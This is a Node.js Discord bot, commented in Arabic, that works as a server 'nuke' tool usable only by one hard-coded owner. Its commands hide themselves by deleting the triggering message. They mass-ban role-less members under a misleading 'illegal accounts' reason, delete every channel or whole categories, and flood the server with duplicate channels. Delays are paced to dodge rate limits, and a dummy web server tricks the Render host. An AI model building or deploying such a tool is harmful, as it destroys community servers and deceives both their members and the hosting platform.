const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
const http = require('http'); // المكتبة السحرية عشان نضحك على ريندر

// 1️⃣ فتح سيرفر وهمي عشان Render يشوف بورت مفتوح ويرتاح نفسياً
const server = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Bot is running successfully!');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`[Render Trick] Dummy server is listening on port ${PORT}`);
});

// 2️⃣ إعدادات البوت الأساسية
const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent, 
        GatewayIntentBits.GuildMembers
    ] 
});

const PREFIX = '.'; // أمر النقطة

client.on('ready', () => {
    console.log(`تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(PREFIX) || message.author.bot) return;

    // 🔒 نظام الأمان الصارم باستخدام الـ ID الخاص بك مباشرة
    const OWNER_ID = '1515394889855275281'; 
    if (message.author.id !== OWNER_ID) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args[0].toLowerCase();

    // 1️⃣ أمر التبنيد الجماعي المخفي: .banall 50 أو .banall 100
    if (command === 'banall') {
        const count = parseInt(args[1]);
        if (isNaN(count) || count <= 0) return;

        try { await message.delete(); } catch (err) {}

        try {
            const members = await message.guild.members.fetch();
            const targets = members.filter(m => !m.user.bot && m.roles.cache.size <= 1).first(count);

            if (targets.length === 0) return;

            for (const member of targets) {
                try {
                    await member.ban({ reason: 'تنظيف الحسابات غير القانونية' });
                    console.log(`تم بنجاح تبنيد العضو: ${member.user.tag}`);
                    await new Promise(resolve => setTimeout(resolve, 20000)); // ديلاي 20 ثانية
                } catch (banError) {
                    console.error(`فشل تبنيد ${member.user.tag}:`, banError);
                }
            }
        } catch (fetchError) {
            console.error(fetchError);
        }
    }

    // 2️⃣ أمر حذف الكاتيجوري وكل الرومات اللي جواتها: .delcat ID_الكاتيجوري
    if (command === 'delcat') {
        const categoryId = args[1];
        if (!categoryId) return;

        try { await message.delete(); } catch (err) {}

        try {
            const category = message.guild.channels.cache.get(categoryId);
            if (!category || category.type !== ChannelType.GuildCategory) return;

            const children = category.children.cache;

            for (const [id, channel] of children) {
                try {
                    await channel.delete();
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (chanErr) {}
            }
            await category.delete();
        } catch (catError) {}
    }

    // 3️⃣ أمر تصفير السيرفر (حذف كاااااافة الرومات والكاتيجوريز بالسيرفر)
    if (command === 'nukechannels') {
        try { await message.delete(); } catch (err) {}

        try {
            // جلب كل رومات السيرفر
            const channels = await message.guild.channels.fetch();
            
            for (const [id, channel] of channels) {
                try {
                    await channel.delete();
                    // ديلاي ثانية واحدة بين كل روم وروم عشان ما نبلع ليمتد وتتم العملية بسلاسة
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (err) {
                    console.error(`فشل حذف الروم ${channel.name}`);
                }
            }
            console.log("تم مسح جميع رومات السيرفر بنجاح!");
        } catch (error) {
            console.error(error);
        }
    }

    // 4️⃣ أمر إنشاء عدد معين من الرومات بنفس الاسم (الحد الأقصى 50)
    if (command === 'makechannels') {
        const count = parseInt(args[1]); // العدد
        const channelName = args.slice(2).join('-'); // اسم الروم

        if (isNaN(count) || count <= 0 || !channelName) return;
        
        // قفل أمان لحمايتك: إذا حدد أكتر من 50 يخليهم 50 تلقائياً
        const finalCount = count > 50 ? 50 : count;

        try { await message.delete(); } catch (err) {}

        try {
            for (let i = 0; i < finalCount; i++) {
                try {
                    await message.guild.channels.create({
                        name: channelName,
                        type: ChannelType.GuildText // رومات كتابية عادية، تقدر تعدلها لـ GuildVoice لو تبيها صوتية
                    });
                    // ديلاي ثانية واحدة لمنع الليمتد أثناء التكراير
                    await new Promise(resolve => setTimeout(resolve, 1000));
                } catch (createErr) {
                    console.error("فشل إنشاء الروم:", createErr);
                }
            }
            console.log(`تم إنشاء ${finalCount} روم باسم ${channelName} بنجاح!`);
        } catch (error) {
            console.error(error);
        }
    }
});

client.login(process.env.TOKEN);
